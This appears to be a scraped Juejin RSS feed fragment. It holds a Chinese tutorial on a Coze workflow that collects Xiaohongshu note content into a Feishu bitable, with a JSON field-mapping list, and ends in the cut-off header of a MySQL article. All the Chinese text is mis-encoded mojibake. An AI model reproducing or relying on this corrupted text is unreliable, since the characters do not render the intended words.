li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å¾é³´ã€‚ä¸“æ³¨äºåˆ†äº«æå‡å·¥ä½œä¸ç”Ÿæ´»æ•ˆç‡çš„å·¥å…·ï¼Œæ— å¿åˆ†äº«AIé¢†åŸŸç›¸å…³çš„ç²¾é€‰æŠ¥å‘Šï¼ŒæŒç»­å…³æ³¨AIçš„å‰æ²¿åŠ¨å‘ã€‚</p>
<p>ä¹‹å‰åˆ†äº«è¿‡ä¸€ç¯‡é‡‡é›†å…¬ä¼—å·æ–‡ç« å†…å®¹åˆ°é£ä¹¦è¡¨æ ¼çš„æ–‡ç« â€”â€”ã€Š<a href="https://juejin.cn/post/7587729264184967231" target="_blank" title="https://juejin.cn/post/7587729264184967231">æ•ˆç‡ç¿»å€ï¼è‡ªåª’ä½“äººå¿…å¤‡ç¥å™¨ï¼šç”¨æ‰£å­(Coze)æ­å»ºä¸“å±ç´ æåº“ï¼Œå‘Šåˆ«çµæ„Ÿæ¯ç«­</a>ã€‹ï¼Œæ•™å¤§å®¶å¦‚ä½•å»ºè®¾ç´ æåº“ã€‚</p>
<p>ç´ æåº“ä»…ä»…æ˜¯å…¬ä¼—å·é‚£è¿˜è¿œè¿œä¸å¤Ÿï¼Œæ‰€ä»¥æœ¬æ–‡å°†ç»§ç»­åˆ†äº«å¦‚ä½•é‡‡é›†å°çº¢ä¹¦çš„ç¬”è®°å†…å®¹åˆ°é£ä¹¦è¡¨æ ¼ï¼Œä»¥ä¾¿åœ¨ä½ çœ‹åˆ°å¥½çš„ç¬”è®°çš„æ—¶å€™å¯ä»¥æ–¹ä¾¿çš„æŠŠå®ƒæ”¶é›†åˆ°ç´ æåº“ä¸­ï¼Œä»¥ä¾¿åç»­åˆ›ä½œå¯ä»¥ä»ç´ æåº“ä¸­æŸ¥æ‰¾çµæ„Ÿã€‚</p>
<p>åœ¨å¼€å§‹å·¥ä½œæµçš„è®²è§£ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ•ˆæœï¼Œæˆ‘åœ¨ä¸€ä¸ªé£ä¹¦å¤šç»´è¡¨æ ¼ä¸­æŠŠéœ€è¦é‡‡é›†ç´ æçš„ç¬”è®°é“¾æ¥æ·»åŠ åˆ°å¤šç»´è¡¨æ ¼ï¼Œç„¶åå†æŠŠå¤šç»´è¡¨æ ¼äº¤ç»™å·¥ä½œæµï¼Œè®©å®ƒè‡ªåŠ¨å®ç°ç¬”è®°å†…å®¹çš„é‡‡é›†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52f8d1d58d6947ca9d8688c481b594ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=CN56i37d5zud8f2cdz1hIUdsGLg%3D" alt="" loading="lazy"/></p>
<p>é‡‡é›†åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹å­—æ®µæœ‰ï¼šæ ‡é¢˜ã€ç¬”è®°ç±»å‹ï¼ˆå›¾æ–‡ã€è§†é¢‘ï¼‰ã€ç‚¹èµæ•°ã€è¯„è®ºæ•°ã€æ”¶è—æ•°ã€åˆ†äº«æ•°ã€é…å›¾åˆ—è¡¨ã€è§†é¢‘åœ°å€ï¼ˆè§†é¢‘ç¬”è®°ï¼‰ã€æ ‡ç­¾åˆ—è¡¨ã€ä½œè€…ã€å‘æ–‡æ—¶é—´ã€å‘æ–‡ä½ç½®ã€æ–‡æ¡ˆå†…å®¹ã€‚</p>
<h2 data-id="heading-0">1. å®Œæ•´çš„å·¥ä½œæµç¨‹</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f63741e18de4277827ad9d0b273ec74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=2hCsFHE4DOf32F0E2eb9Knij6gI%3D" alt="" loading="lazy"/></p>
<p>1ã€è¯»å–é£ä¹¦è¡¨æ ¼ç¬”è®°é“¾æ¥ï¼šé€šè¿‡ä½¿ç”¨æ‰£å­å®˜æ–¹æ’ä»¶ä»é£ä¹¦å¤šç»´è¡¨æ ¼ä¸­è¯»å–æ•´ç†åˆ°çš„å°çº¢ä¹¦ç¬”è®°é“¾æ¥ã€‚</p>
<p>2ã€å°çº¢ä¹¦ç¬”è®°å†…å®¹è·å–ï¼šé€šè¿‡å°çº¢ä¹¦ç¬”è®°è¯¦æƒ…å†…å®¹è¯»å–å·¥å…·è¯»å–å°çº¢ä¹¦ç¬”è®°å†…å®¹ã€‚</p>
<p>3ã€ç¬”è®°æ•°æ®è½¬æˆé£ä¹¦è¡¨æ ¼æ ¼å¼ï¼šé€šè¿‡æŠŠè¯»å–åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹è½¬æˆé£ä¹¦è¡¨æ ¼éœ€è¦çš„æ ¼å¼ã€‚</p>
<p>4ã€ç¬”è®°æ•°æ®æ›´æ–°åˆ°é£ä¹¦è¡¨æ ¼ï¼šæŠŠè½¬åŒ–å¥½çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹å†™å›é£ä¹¦è¡¨æ ¼ä¸­ã€‚</p>
<h2 data-id="heading-1">2. å·¥ä½œæµè¯¦ç»†èŠ‚ç‚¹è§£è¯»</h2>
<h3 data-id="heading-2">2.1. å¼€å§‹</h3>
<ul>
<li>api_tokenï¼šæ’ä»¶è®¤è¯ï¼Œå¯åå°å›å¤ã€èŠéº»å¼€é—¨ã€‘è”ç³»è·å–ï¼ˆæœ‰æ¡ä»¶ï¼‰</li>
<li>app_tokenï¼šé£ä¹¦å¤šç»´è¡¨æ ¼æ ‡è¯†</li>
<li>fs_app_idï¼šé£ä¹¦åº”ç”¨ID</li>
<li>fs_app_secretï¼šé£ä¹¦åº”ç”¨å¯†é’¥</li>
<li>table_nameï¼šé£ä¹¦å¤šç»´è¡¨æ ¼æ•°æ®è¡¨åç§°</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5717c73d44614b29b339fd6e8aa36b78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=nOrDOLsF6kg3laCuGQT93cg99vo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-3">2.1.1. app_token&amp;table_name&amp;fs_app_id&amp;fs_app_secret å¦‚ä½•è·å–ï¼Ÿ</h4>
<p>è¿™å‡ ä¸ªå‚æ•°çš„è·å–æ–¹å¼å¯ä»¥æŸ¥çœ‹æˆ‘ä¹‹å‰å‘çš„æ–‡ç« â€”â€”ã€Šæ•ˆç‡ç¿»å€ï¼è‡ªåª’ä½“äººå¿…å¤‡ç¥å™¨ï¼šç”¨æ‰£å­(Coze)æ­å»ºä¸“å±ç´ æåº“ï¼Œå‘Šåˆ«çµæ„Ÿæ¯ç«­ã€‹ï¼Œè¿™é‡Œä¸å†è¯¦ç»†å±•å¼€ã€‚</p>
<h3 data-id="heading-4">2.2. è¯»å–è¡¨æ ¼æ•°æ®</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è¯»å–é£ä¹¦è¡¨æ ¼ä¸­çš„æ•°æ®ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„æ’ä»¶ã€é£ä¹¦å¤šç»´è¡¨æ ¼ã€‘çš„ã€search_recordã€‘å·¥å…·ï¼Œå‚æ•°å°±æŒ‰ç…§æˆ‘æˆªå›¾å¡«å†™å³å¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3356e6076360476abd56645b091b2a11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=jy5cnPUE5UKFwYbT8xUwuhKi0MI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.3. è·å–é£ä¹¦è®¤è¯</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è·å–é£ä¹¦æ¥å£è®¤è¯ï¼Œä¾¿äºåé¢è°ƒç”¨æ¥å£ä¸Šä¼ å›¾ç‰‡åˆ°é£ä¹¦è¡¨æ ¼ä¸­ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€tenant_access_tokenã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3fd5b26c36b42c28ddd60a054cdd2ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=vvXxy2jpX7VG5NRLw8z1prPgy6E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">2.4. æ‰¹é‡è·å–ç´ æ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹çš„å¾ªç¯èŠ‚ç‚¹ï¼Œç”¨æ¥å¾ªç¯è·å–å°çº¢ä¹¦ç¬”è®°å†…å®¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f8e715a163546c5b26a584586d6a681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=lzF2PpwD47ZZgip9yhnqGIHECpA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">2.5. è·å–ç¬”è®°url</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥ä»è¯»å–åˆ°çš„é£ä¹¦å¤šç»´è¡¨æ ¼è®°å½•ä¸­è·å–ç¬”è®°çš„é“¾æ¥ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å­—ç¬¦ä¸²å·¥å…·åˆé›†ã€‘çš„ã€get_json_valueã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd75c0cc05a345fc9b9649a0f78f4d38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=DovC3YfwD3%2B%2F%2BqoddIv50wz5Rlc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">2.6. å°çº¢ä¹¦ç¬”è®°å†…å®¹è·å–</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥è¯»å–å°çº¢ä¹¦ç¬”è®°çš„å†…å®¹ï¼Œä¼šè¿”å›ç¬”è®°æ ‡é¢˜ã€é…å›¾ã€ä½œè€…ã€è§†é¢‘ã€å‘å¸ƒæ—¶é—´ç­‰å†…å®¹ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­çš„ä¸‰æ–¹æ’ä»¶ã€å°çº¢ä¹¦å·¥å…·ç®±ã€‘çš„ã€get_xhs_note_detail_cookiesã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7378e3de2d4408696b891a112d18cb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=CUbm1bJF3pYHpBO9ouu5kK0o9VE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2.7. æ‰¹é‡ä¸Šä¼ ç¬”è®°å›¾ç‰‡åˆ°é£ä¹¦è¡¨æ ¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠé‡‡é›†åˆ°çš„ç¬”è®°å›¾ç‰‡ä¸Šä¼ åˆ°é£ä¹¦å¤šç»´è¡¨æ ¼ä¸­ï¼Œä»¥ä¾¿å¯ä»¥å½“ä½œè¡¨æ ¼çš„é™„ä»¶ç›´æ¥æµè§ˆï¼Œæ— éœ€è·³è½¬ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­çš„ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€batch_upload_mdediasã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c142a71f154476884798867025dd3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=TUGhhwBEjljykN587E2eHsoxmo8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">2.8. ç¬”è®°å›¾è½¬æˆé£ä¹¦æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠä¸Šä¼ åçš„å›¾ç‰‡è¿”å›çš„ç»“æœè½¬åŒ–æˆåç»­è¦ä½¿ç”¨åˆ°çš„é£ä¹¦è¡¨æ ¼çš„æ ¼å¼ï¼Œç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€upload_files_result_to_jsonã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7423146e5ae24b948a094d629528dce0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=EBOjgnZo2Qf%2B%2B5rVhUF4nNuKwqw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">2.9. å°çº¢ä¹¦ç¬”è®°å†…å®¹è½¬æˆé£ä¹¦æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠé‡‡é›†åˆ°çš„å°çº¢ä¹¦ç¬”è®°å†…å®¹è½¬æˆåç»­éœ€è¦ä½¿ç”¨çš„æ ¼å¼ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€å°çº¢ä¹¦å·¥å…·ç®±ã€‘çš„ã€xhs_note_to_jsonã€‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7592556df9d049349e40e7f1c1df163d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=lZoZY9AeeXlJJgKzk5ddOtCEu5c%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">2.10. ç¬”è®°æ•°æ®è½¬æˆé£ä¹¦è¡¨æ ¼è®°å½•æ ¼å¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æŠŠå°çº¢ä¹¦çš„ç¬”è®°æ•°æ®è½¬æˆéœ€è¦å†™å…¥å¤šç»´è¡¨æ ¼çš„æ•°æ®æ ¼å¼ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­ä¸‰æ–¹æ’ä»¶ã€é£ä¹¦å·¥å…·ç®±ã€‘çš„ã€data_to_feishuã€‘å·¥å…·ã€‚</p>
<p>è¿™ä¸ªå·¥å…·çš„åŸç†æ˜¯æŠŠå°çº¢ä¹¦çš„ç¬”è®°æ•°æ®ï¼Œé€šè¿‡æ˜ å°„è§„åˆ™ï¼Œæ˜ å°„åˆ°é£ä¹¦å¤šç»´è¡¨æ ¼çš„ä¸åŒå­—æ®µä¸Šé¢å»ï¼Œåªéœ€è¦ç¼–å†™æ˜ å°„çš„è§„åˆ™å³å¯ï¼Œè§£å†³ç¬”è®°æ•°æ®ä¸é£ä¹¦å¤šç»´è¡¨æ ¼å­—æ®µä¸åŒ¹é…çš„gapã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acce6692be26442eaad04964f3c11826~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=i3GSTWxt6ivnJOuqrIspgiLeRtY%3D" alt="" loading="lazy"/></p>
<ul>
<li>æ˜ å°„è§„åˆ™ï¼Œç›´æ¥è´´è¿›rulesä¸­å³å¯ã€‚</li>
</ul>

<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ ‡é¢˜"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.note_title"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"ç¬”è®°ç±»å‹"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.type"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"ç‚¹èµæ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.liked_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"è¯„è®ºæ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.comment_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ”¶è—æ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.collected_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"åˆ†äº«æ•°"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.share_count"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"é…å›¾"</span>,    <span class="hljs-string">"idx"</span>: 2,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.file_infos_json"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"è§†é¢‘åœ°å€"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.video_url"</span>,    <span class="hljs-string">"field_type"</span>: 15  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ ‡ç­¾åˆ—è¡¨"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.tag_list_str"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"ä½œè€…"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.nickname"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"å‘æ–‡æ—¶é—´"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.publish_time"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"å‘æ–‡ä½ç½®"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.ip_location"</span>  },  {    <span class="hljs-string">"field_name"</span>: <span class="hljs-string">"æ–‡æ¡ˆå†…å®¹"</span>,    <span class="hljs-string">"idx"</span>: 1,    <span class="hljs-string">"json_path"</span>: <span class="hljs-string">"$.note_desc"</span>  }]</span>
</code></pre>
<h3 data-id="heading-13">2.11. æ›´æ–°è®°å½•åˆ°é£ä¹¦è¡¨æ ¼</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯æŠŠæ•°æ®æ›´æ–°å›é£ä¹¦è¡¨æ ¼ä¸­ï¼Œä½¿ç”¨åˆ°äº†æ‰£å­å®˜æ–¹æ’ä»¶ã€é£ä¹¦å¤šç»´è¡¨æ ¼ã€‘çš„ã€update_recordsã€‘å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8512e53586374a16bf1a8f98c717ddbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=cZDzlxNBZ8tP37WNAQlTbxlMp8E%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2.12. ç»“æŸ</h3>
<p>recordsæœ‰å†…å®¹è¯´æ˜æˆåŠŸï¼Œæ²¡æœ‰å†…å®¹è¯´æ˜å¤±è´¥ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9e123a6e6b34e56b29484bf97ba2cb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=CQlTS1xtG1xR53UmGowcDJMRBdw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">3. æ€»ç»“</h2>
<p>å¯¹äºè¿™ç§æµç¨‹è¾ƒé‡çš„å·¥ä½œæµï¼Œä¸»è¦çš„éš¾ç‚¹è¿˜æ˜¯åœ¨æ•°æ®çš„å¤„ç†ä»¥åŠé£ä¹¦å¤šç»´è¡¨æ ¼çš„æƒé™é…ç½®ä¸Šï¼Œä¸è¿‡æƒé™çš„é…ç½®åªéœ€è¦é…ç½®ä¸€æ¬¡å°±å¯ä»¥ä¸€ç›´ä½¿ç”¨ï¼Œæ— éœ€é‡å¤é…ç½®ï¼Œå…³äºå¤šç»´è¡¨æ ¼æƒé™çš„é…ç½®ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘æ–‡ç« å¼€å¤´è¯´çš„é‚£ä¸€ç¯‡æ–‡ç« ï¼Œé‚£ç¯‡æ–‡ç« å·²ç»è®²çš„æ¯”è¾ƒæ¸…æ¥šäº†ã€‚</p>
<p>æ•°æ®çš„å¤„ç†çš„è¯ï¼Œå°±æŒ‰ç…§æˆ‘æ–‡ç« è¿›è¡Œæ­å»ºå³å¯ï¼Œæœ‰é—®é¢˜å¯ä»¥è¯„è®ºåŒºç•™è¨€æˆ–è€…ç§ä¿¡æˆ‘ï¼Œçœ‹åˆ°éƒ½ä¼šç¬¬ä¸€æ—¶é—´å›å¤ã€‚</p>
<p>æœ¬æ–‡çš„åˆ†äº«å°±åˆ°è¿™é‡Œï¼Œå¦‚æœæ‚¨è§‰å¾—æœ‰æ”¶è·çš„è¯ï¼Œå¯ä»¥ç»™ä¸ªä¸€é”®ä¸‰è¿ï¼Œæ‚¨çš„é¼“åŠ±æ˜¯å¾é³´æŒç»­è¾“å‡ºçš„æœ€å¤§åŠ¨åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/585825be7c6943a893ede74c18d24857~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768446739&amp;x-signature=9r7ZTMDBylcqCggY3HAL3U7TEyE%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘å®æˆ˜äº†ä¸€äº›æ‰£å­ï¼ˆCozeï¼‰å·¥ä½œæµç›¸å…³çš„æ¡ˆä¾‹ï¼ŒåŒ…å«å°çº¢è–¯å›¾æ–‡ç”Ÿæˆã€çˆ†æ¬¾è§†é¢‘å‰ªè¾‘ã€åŠå…¬ææ•ˆç­‰æ‰£å­æ¡ˆä¾‹ï¼Œå†…é™„è¯¦ç»†çš„æ•™ç¨‹å’Œå·¥ä½œæµå®‰è£…åŒ…ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥æ¥ä¸ª<strong>ä¸€é”®ä¸‰è¿ï¼ˆå¿…é¡»åŠ¨ä½œï¼‰</strong> ï¼Œæ–‡ç« è¯„è®ºåŒºè¯„è®ºâ€œ<strong>æ‰£å­æ¡ˆä¾‹</strong>â€é¢†å–ï¼ˆè¿™äº›æ¡ˆä¾‹ä¸åŒ…å«æœ¬æ–‡åˆ†äº«çš„æ¡ˆä¾‹ï¼Œå¦‚æœéœ€è¦æœ¬æ–‡åˆ†äº«çš„æ¡ˆä¾‹å®‰è£…åŒ…å¯ä»¥åå°ç§ä¿¡æˆ‘ï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL ä¼˜åŒ–ä»åº“å»¶è¿Ÿçš„ä¸€äº›æ€è·¯]]></title>    <link>https://juejin.cn/post/7592515924700512291</link>    <guid>https://juejin.cn/post/7592515924700512291</guid>    <pubDate>2026-01-08T03:16:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924700512291" data-draft-id="7592500570167312419" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL ä¼˜åŒ–ä»åº“å»¶è¿Ÿçš„ä¸€äº›æ€è·¯"/> <meta itemprop="keywords" content="MySQL,æ•°æ®åº“,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-08T03:16:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çˆ±å¯ç”Ÿå¼€æºç¤¾åŒº"/> <meta itemprop="url" content="https://juejin.cn/user/1480387593251847"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL ä¼˜åŒ–ä»åº“å»¶è¿Ÿçš„ä¸€äº›æ€è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1480387593251847/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çˆ±å¯ç”Ÿå¼€æºç¤¾åŒº
